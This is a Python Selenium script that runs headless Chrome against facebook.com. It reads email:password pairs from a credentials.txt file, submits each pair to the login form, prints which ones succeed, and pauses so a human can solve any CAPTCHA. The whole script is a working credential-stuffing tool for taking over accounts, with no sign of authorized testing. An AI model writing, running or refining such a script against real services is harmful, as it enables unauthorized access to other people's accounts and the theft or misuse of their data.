from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time

# Setup Chrome options
options = Options()
options.add_argument("--headless")  # Ensures the browser operates in headless mode
options.add_argument("--no-sandbox")  # Bypass OS security model, mandatory on some systems
options.add_argument("--disable-gpu")  # Applicable to windows os only
options.add_argument("--window-size=1920x1080")  # Specify the window size

# Initialize ChromeDriver with headless options
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
driver.get('https://www.facebook.com')

# Reading credentials from file
with open('credentials.txt', 'r') as file:
    credentials = [line.strip().split(':') for line in file.readlines()]

# Function to check login success
def check_login():
    time.sleep(0)  # Minimal wait, adjust as necessary
    try:
        driver.find_element(By.ID, 'email')
        return False
    except NoSuchElementException:
        return True

# Function to detect CAPTCHA
def check_captcha():
    try:
        captcha = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "captcha_element_id")))
        print("CAPTCHA detected. Please solve the CAPTCHA and press Enter to continue.")
        input()  # Wait for user to solve CAPTCHA and press Enter
        return True
    except TimeoutException:
        return False

# Iterating through credentials
for email, password in credentials:
    try:
        email_field = driver.find_element(By.ID, 'email')
        password_field = driver.find_element(By.ID, 'pass')
        login_button = driver.find_element(By.NAME, 'login')

        email_field.clear()
        password_field.clear()
        email_field.send_keys(email)
        password_field.send_keys(password)
        login_button.click()

        if check_login():
            print(f'Login successful for: {email}')
        else:
            if not check_captcha():  # Check if CAPTCHA was the reason for failure
                print(f'Login failed for: {email}')
        driver.get('https://www.facebook.com')
    except Exception as e:
        print(f'An error occurred with {email}: {str(e)}')

driver.quit()
